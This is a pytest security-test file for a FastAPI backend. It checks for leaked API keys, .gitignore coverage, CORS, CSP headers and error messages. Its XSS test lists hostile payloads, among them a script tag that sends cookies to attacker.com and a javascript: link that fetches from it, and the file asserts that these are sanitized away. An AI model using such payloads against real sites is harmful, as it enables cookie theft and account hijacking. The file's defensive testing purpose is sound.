"""Automated security audit and production hardening tests for The Lenny Growth Assistant."""

import sys
import os
import re
import pytest
from fastapi.testclient import TestClient

# Add backend directory to sys.path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from app.main import app
from app.core.config import settings
from app.services.artifact_renderer import get_sandbox_security_headers
from app.agents.orchestrator import sanitize_artifact_content

client = TestClient(app)

WORKSPACE_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), "../.."))

def test_env_example_sanitization():
    """Verify that .env.example contains only dummy placeholders and zero committed live secrets."""
    env_example_path = os.path.join(WORKSPACE_ROOT, ".env.example")
    assert os.path.exists(env_example_path), ".env.example must exist in repository root"

    with open(env_example_path, "r", encoding="utf-8") as f:
        content = f.read()

    # Verify absence of real live Anthropic or OpenAI keys
    assert not re.search(r"sk-ant-api03-[A-Za-z0-9_-]{20,}", content), "Real Anthropic key detected in .env.example!"
    assert not re.search(r"sk-proj-[A-Za-z0-9_-]{20,}", content), "Real OpenAI key detected in .env.example!"
    assert not re.search(r"ghp_[A-Za-z0-9]{20,}", content), "GitHub token detected in .env.example!"

    # Verify placeholder presence
    assert "your_anthropic_api_key_here" in content or "ANTHROPIC_API_KEY=" in content
    assert "your_openai_api_key_here" in content or "OPENAI_API_KEY=" in content


def test_gitignore_coverage():
    """Verify that .gitignore excludes sensitive files, databases, and build artifacts."""
    gitignore_path = os.path.join(WORKSPACE_ROOT, ".gitignore")
    assert os.path.exists(gitignore_path), ".gitignore must exist in repository root"

    with open(gitignore_path, "r", encoding="utf-8") as f:
        content = f.read()

    required_exclusions = [
        ".env",
        "*.db",
        "node_modules",
        "dist",
        "__pycache__",
        ".pytest_cache",
    ]

    for item in required_exclusions:
        assert item in content, f"Missing {item} in .gitignore"


def test_cors_preflight_and_headers():
    """Verify CORS preflight correctly handles allowed origins and restricts disallowed headers."""
    # Test valid origin preflight
    res = client.options(
        "/api/v1/sessions",
        headers={
            "Origin": "http://localhost:3000",
            "Access-Control-Request-Method": "POST",
            "Access-Control-Request-Headers": "Content-Type",
        },
    )
    assert res.status_code == 200
    assert "access-control-allow-origin" in res.headers
    assert res.headers["access-control-allow-origin"] in ["http://localhost:3000", "*"] or "localhost:3000" in res.headers["access-control-allow-origin"]


def test_strict_csp_and_security_headers():
    """Verify get_sandbox_security_headers enforces defense-in-depth isolation headers."""
    headers = get_sandbox_security_headers()

    # Content-Security-Policy checks
    csp = headers.get("Content-Security-Policy", "")
    assert "default-src 'none'" in csp
    assert "frame-ancestors 'self'" in csp
    assert "base-uri 'none'" in csp
    assert "form-action 'none'" in csp

    # Anti-sniffing and clickjacking checks
    assert headers.get("X-Content-Type-Options") == "nosniff"
    assert headers.get("X-Frame-Options") == "SAMEORIGIN"
    assert headers.get("Referrer-Policy") == "no-referrer"
    assert "no-store" in headers.get("Cache-Control", "")


def test_xss_sanitization_defense_in_depth():
    """Verify multi-stage sanitization purges script tags, event handlers, and javascript URIs."""
    attack_vectors = [
        "<script>window.location='http://attacker.com/steal?cookie='+document.cookie</script>",
        "<img src=x onerror=\"javascript:alert('XSS')\" />",
        "<a href=\"javascript:void(fetch('http://attacker.com/leak'))\">Click for Bonus</a>",
        "<iframe src=\"http://attacker.com/evil\"></iframe>",
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s /></svg>",
    ]

    for payload in attack_vectors:
        sanitized = sanitize_artifact_content(payload)
        assert "<script" not in sanitized.lower()
        assert "onerror" not in sanitized.lower()
        assert "javascript:" not in sanitized.lower()
        assert "<iframe" not in sanitized.lower()
        assert "onbegin" not in sanitized.lower()


def test_no_secret_leak_in_error_responses():
    """Verify that error responses do not leak database passwords, file paths, or internal tokens."""
    # 404 response
    res_404 = client.get("/api/v1/sessions/nonexistent-session-id-12345")
    body_404 = res_404.text.lower()
    assert "password" not in body_404
    assert "postgresql://" not in body_404
    assert "traceback" not in body_404

    # 422 response
    res_422 = client.post("/api/v1/sessions", json={"title": 12345, "invalid_field": "test"})
    body_422 = res_422.text.lower()
    assert "password" not in body_422
    assert "secret" not in body_422
    assert "traceback" not in body_422
